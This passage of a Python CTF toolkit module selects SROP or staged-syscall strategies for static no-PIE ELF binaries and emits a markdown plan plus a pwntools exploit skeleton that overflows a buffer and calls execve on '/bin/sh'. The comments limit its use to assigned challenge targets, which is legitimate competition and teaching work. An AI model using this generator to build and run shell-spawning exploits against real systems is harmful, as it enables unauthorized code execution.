        alternatives.append("staged-read-syscall")

    if chosen == "srop":
        chain, conf, payload = srop_chain, srop_conf, srop_payload
        notes.extend(srop_notes)
        if staged_available:
            notes.append("inline memory-syscall gadget also present -- a staged-read syscall chain is "
                         "the intended alternative (see alternatives)")
        if staged_notes and not staged_available:
            notes.extend(staged_notes[:1])
    elif chosen == "staged-read-syscall":
        chain, conf, payload = staged_chain, staged_conf, None
        notes.extend(staged_notes)
        if srop_available:
            notes.append("a `syscall`+`pop rax` SROP chain is also available (see alternatives)")
        elif srop_notes:
            notes.extend(srop_notes[:1])
    else:
        notes.append("neither an SROP surface (`syscall`+`pop rax`) nor an inline memory-syscall "
                     "gadget with an rbp pivot was recognised; no execve chain could be assembled")
        notes.extend(srop_notes[:1])
        notes.extend(staged_notes[:1])
        return SropAutobuildPlan("none", profile.arch, profile.bits, "none", profile.as_dict(),
                                 tuple(g.as_dict() for g in syscall_gadgets),
                                 pivot_plan.as_dict(), {"strategy": "none"}, tuple(notes),
                                 alternatives=tuple(alternatives))

    return SropAutobuildPlan(
        strategy=chosen, arch=profile.arch, bits=profile.bits, confidence=conf,
        profile=profile.as_dict(),
        syscall_gadgets=tuple(g.as_dict() for g in syscall_gadgets),
        read_pivot=pivot_plan.as_dict(),
        chain=chain, notes=tuple(notes), payload=payload, alternatives=tuple(alternatives),
    )


# --------------------------------------------------------------------------- rendering

def plan_markdown(plan: SropAutobuildPlan) -> str:
    prof = plan.profile
    out = [
        "# Static-nostdlib SROP / execve autobuild plan",
        "",
        f"- arch: `{plan.arch}` ({plan.bits}-bit)",
        f"- static: {prof.get('static')}   no-PIE: {prof.get('no_pie')}   "
        f"nostdlib: {prof.get('nostdlib')}",
        f"- strategy: **{plan.strategy}**   confidence: **{plan.confidence}**",
    ]
    if plan.alternatives:
        out.append(f"- alternatives: {', '.join(plan.alternatives)}")
    bss = prof.get("bss_region")
    if bss:
        out.append(f"- .bss scratch: vaddr `{bss['vaddr']:#x}` filesz `{bss['filesz']:#x}` "
                   f"memsz `{bss['memsz']:#x}` (zero gap `{bss['bss_gap']:#x}`)")
    out.append("")
    if plan.syscall_gadgets:
        out.append("## Syscall surface")
        out.append("| addr | kind | rbp loads |")
        out.append("|------|------|-----------|")
        for g in plan.syscall_gadgets[:16]:
            loads = ", ".join(f"{r}=[rbp{d:+#x}]" for r, d in g["loads"]) or "-"
            out.append(f"| `{g['address']:#x}` | {g['kind']} | {loads} |")
        out.append("")
    if plan.read_pivot:
        rp = plan.read_pivot
        out.append("## Read pivot")
        pv = f"{rp['pivot_target']:#x}" if rp.get("pivot_target") is not None else "<supply>"
        out.append(f"- primitive: `{rp['primitive']}`   pivot target: {pv}")
        for s in rp["stages"]:
            out.append(f"{s['index']}. {s['action']} -- {s['note']}")
        out.append("")
    out.append("## Chain")
    out.append("```json")
    out.append(json.dumps(plan.chain, indent=2))
    out.append("```")
    out.append("")
    if plan.notes:
        out.append("## Notes")
        for n in plan.notes:
            out.append(f"- {n}")
        out.append("")
    if plan.payload is not None:
        out.append(f"## Concrete payload ({len(plan.payload)} bytes)")
        out.append("```")
        out.append(plan.payload.hex())
        out.append("```")
    return "\n".join(out) + "\n"


def render_pwntools(plan: SropAutobuildPlan, *, binary: str = "./chall") -> str:
    """A paste-ready pwntools skeleton for the plan.  Text only; nothing here runs it."""
    lines = [
        "#!/usr/bin/env python3",
        "# Generated by toolkits.srop_autobuild (B-052) -- a PLAN. Review every value, then run it",
        "# ONLY against your assigned target, inside the pwn Docker image. Nothing here is executed.",
        "from pwn import *",
        "",
        "context.update(arch='amd64' if %d == 64 else 'i386', os='linux')" % plan.bits,
        f"exe = ELF({binary!r}, checksec=False)",
        "",
        f"# strategy: {plan.strategy}   confidence: {plan.confidence}",
    ]
    chain = plan.chain
    if plan.strategy == "srop":
        sg = chain.get("syscall_gadget")
        pr = chain.get("accumulator_gadget")
        cmd = chain.get("command_address")
        stk = chain.get("stack_address")
        lines += [
            "from pwnlib.rop.srop import SigreturnFrame",
            f"syscall  = {hex(sg) if isinstance(sg, int) else 'SYSCALL_GADGET'}",
            f"pop_rax  = {hex(pr) if isinstance(pr, int) else 'POP_RAX'}",
            f"binsh    = {hex(cmd) if isinstance(cmd, int) else 'BINSH_IN_BSS'}  # stage \"/bin/sh\" here first",
            f"stack    = {hex(stk) if isinstance(stk, int) else 'BSS_SCRATCH'}",
            "offset   = %s" % (chain.get("overflow_offset")
                               if isinstance(chain.get("overflow_offset"), int) else "OFFSET"),
            "",
            "frame = SigreturnFrame()",
            "frame.rax = 59            # SYS_execve",
            "frame.rdi = binsh",
            "frame.rsi = 0",
            "frame.rdx = 0",
            "frame.rip = syscall",
            "frame.rsp = stack",
            "",
            "# stage 1: write \"/bin/sh\\x00\" into `binsh` (a second read into .bss)",
            "# stage 2: the sigreturn trigger + frame as the overflow payload:",
            "payload  = b'A' * offset",
            "payload += p64(pop_rax) + p64(15) + p64(syscall)   # rax=15, syscall -> sigreturn",
            "payload += bytes(frame)",
        ]
    elif plan.strategy == "staged-read-syscall":
        gaddr = chain.get("gadget_address")
        pivot = chain.get("pivot_target")
        lines += [
            f"gadget = {hex(gaddr) if isinstance(gaddr, int) else 'INLINE_SYSCALL_GADGET'}",
            f"pivot  = {hex(pivot) if isinstance(pivot, int) else 'BSS_PIVOT'}  # rbp lands here",
            "offset = OFFSET   # buffer -> saved rbp / saved return address",
            "",
            "# stage 1: overflow, saved rbp = pivot, return into the read / `leave;ret`",
            "# stage 2: at `pivot`, lay the execve operands the gadget reads from [rbp-disp]:",
        ]
        for slot in chain.get("register_layout", []):
            addr = slot.get("stage_addr")
            addr_s = hex(addr) if isinstance(addr, int) else f"pivot{slot['rbp_disp']:+#x}"
            lines.append(f"#   [{addr_s}] = {slot['value']}   ({slot['register']} = [rbp{slot['rbp_disp']:+#x}])")
        lines.append("# then return into `gadget` to run syscall(rax, rdi, rsi, rdx)")
    else:
        lines.append("# no execve chain assembled; see the plan notes")
    lines += ["", "# io = remote(HOST, PORT)   # your assigned target only",
              "# io.sendline(payload)", "# io.interactive()"]
    return "\n".join(lines) + "\n"


# --------------------------------------------------------------------------- engine entry

_ELF_MAGIC = b"\x7fELF"


def _find_elves(challenge_dir: Path, *, cap: int = 64) -> list[Path]:
    found: list[Path] = []
    for p in sorted(challenge_dir.rglob("*")):
        if len(found) >= cap:
            break
        if not p.is_file() or p.is_symlink():
            continue
        if "recon" in p.relative_to(challenge_dir).parts:
            continue  # our own output / other engines' output, never a handout
        try:
            if p.stat().st_size < 20 or p.stat().st_size > MAX_BYTES:
                continue
            with p.open("rb") as fh:
                if fh.read(4) == _ELF_MAGIC:
                    found.append(p)
        except OSError:
            continue
    return found


def _decompile_hints(challenge_dir: Path, elf_name: str) -> list[str]:
    """Carry a couple of lines from B-011's decompile output (recon/decompile/<file>/*.c), when it
    recognised a read-style overflow.  Read-only; never re-runs a decompiler, never executes anything.
    """
    base = challenge_dir / "recon" / "decompile" / elf_name
    if not base.is_dir():
        return []
    hints: list[str] = []
    for c in sorted(base.glob("*.c")):
        try:
            text = c.read_text(errors="replace")
        except OSError:
            continue
        for fn in _READ_OVERFLOW_FUNCS:
            if f"{fn}(" in text:
                hints.append(f"{c.name}: calls {fn}() -- likely the overflow read; confirm the length "
                             "vs the buffer size for the offset")
                break
        if len(hints) >= 4:
            break
    return hints


def _opt_int(opts: Mapping, key: str) -> int | None:
    v = opts.get(key)
    if v is None:
        return None
    if isinstance(v, bool):
        raise SropBuildError(f"--opt {key} must be an integer, not a boolean")
    if isinstance(v, int):
        return v
    try:
        return int(str(v).strip(), 0)
    except ValueError as exc:
        raise SropBuildError(f"--opt {key}={v!r} is not an integer") from exc


def solve(challenge_dir, profile, **opts):
    """Contract entry: recognise static no-PIE ELF(s) in the handout, build an SROP/syscall-execve
    plan for each, write it to the workspace, and report.  Never runs the binary; a flag is returned
    only when it is literally in the binary's bytes."""
    from ctf.result import SolverResult, Evidence
    from ctf import flagfmt

    challenge_dir = Path(challenge_dir)
    elves = _find_elves(challenge_dir)
    if not elves:
        return SolverResult("blocked",
                            notes="no ELF binary in the handout; srop_autobuild plans against a local "
                                  "static no-PIE ELF",
                            engine="toolkits.srop_autobuild")

    strategy = opts.get("strategy")
    overflow_offset = _opt_int(opts, "buffer_offset")
    binsh = _opt_int(opts, "binsh")
    pivot = _opt_int(opts, "pivot")
    stack = _opt_int(opts, "stack")

    ff = flagfmt.for_profile(profile) if profile is not None else None
    evidence: list = []
    flags: list[str] = []
    best: tuple[int, SropAutobuildPlan, Path] | None = None
    out_root = challenge_dir / "recon" / "srop_autobuild"

    for path in elves:
        data = path.read_bytes()
        if ff is not None:
            for f in ff.find_flags(data):
                if f not in flags:
                    flags.append(f)
                    evidence.append(Evidence("string", f"flag literal in {path.name}", path=str(path)))
        try:
            plan = build_plan(
                data, strategy=strategy, overflow_offset=overflow_offset,
                binsh_addr=binsh, pivot_addr=pivot, stack_addr=stack,
                decompile_hints=_decompile_hints(challenge_dir, path.name),
            )
        except SropBuildError as exc:
            evidence.append(Evidence("recon", f"{path.name}: {exc}", path=str(path)))
            continue
        out_root.mkdir(parents=True, exist_ok=True)
        md = out_root / f"{path.name}.plan.md"
        py = out_root / f"{path.name}.exploit.py"
        js = out_root / f"{path.name}.plan.json"
        md.write_text(plan_markdown(plan))
        py.write_text(render_pwntools(plan, binary=f"./{path.name}"))
        js.write_text(json.dumps(plan.as_dict(), indent=2))
        evidence.append(Evidence("plan", f"{path.name}: {plan.strategy} ({plan.confidence})",
                                 path=str(md)))
        rank = _CONF_RANK.get(plan.confidence, 9)
        # prefer an applicable plan (not 'none') even when its confidence is weaker than a 'none'.
        rank += 0 if plan.strategy != "none" else 10
        if best is None or rank < best[0]:
            best = (rank, plan, path)

    if flags:
        return SolverResult("candidate", flags=tuple(flags), evidence=tuple(evidence),
                            notes="flag literal(s) found in the binary; a plan was also written to "
                                  "recon/srop_autobuild/",
                            engine="toolkits.srop_autobuild")
    if best is None:
        return SolverResult("blocked", evidence=tuple(evidence),
                            notes="ELF(s) present but unrecognisable; see evidence",
                            engine="toolkits.srop_autobuild")
    _r, plan, path = best
    if plan.strategy == "none":
        return SolverResult("none", evidence=tuple(evidence),
                            notes=f"{path.name}: not the static-nostdlib SROP/syscall regime, or no "
                                  f"syscall-execve surface found ({plan.confidence})",
                            engine="toolkits.srop_autobuild")
    summary = (f"{path.name}: {plan.strategy} plan ({plan.confidence})"
               + (f"; alternatives: {', '.join(plan.alternatives)}" if plan.alternatives else "")
               + "; run it by hand against the live target (plan engine, never executes)")
    return SolverResult("unsure", evidence=tuple(evidence), notes=summary,
                        engine="toolkits.srop_autobuild")


# --------------------------------------------------------------------------- standalone CLI

def main(argv: Sequence[str] | None = None) -> int:
    ap = argparse.ArgumentParser(
        description="Static-nostdlib SROP/execve autobuilder (plan only, never runs a binary).")
    ap.add_argument("elf", help="the local static no-PIE ELF to plan against")
    ap.add_argument("--strategy", default=None, choices=["srop", "staged-read-syscall"],
                    help="force the chain kind")
    ap.add_argument("--buffer-offset", default=None, help="padding to the saved return address")
    ap.add_argument("--binsh", default=None, help="address to stage \"/bin/sh\" (a writable .bss page)")
    ap.add_argument("--pivot", default=None, help="rbp pivot target in .bss for the staged read")
    ap.add_argument("--stack", default=None, help="scratch address for the SROP frame rsp")
    ap.add_argument("--json", action="store_true", help="emit the plan as JSON")
    args = ap.parse_args(list(argv) if argv is not None else None)

    def _int(v):
        return None if v is None else int(str(v), 0)

    try:
        plan = build_plan(
            args.elf, strategy=args.strategy, overflow_offset=_int(args.buffer_offset),
            binsh_addr=_int(args.binsh), pivot_addr=_int(args.pivot), stack_addr=_int(args.stack))
    except SropBuildError as exc:
        print(f"error: {exc}", file=sys.stderr)
        return 2
    if args.json:
        print(json.dumps(plan.as_dict(), indent=2))
    else:
        print(plan_markdown(plan))
    return 0


if __name__ == "__main__":  # pragma: no cover
    raise SystemExit(main())
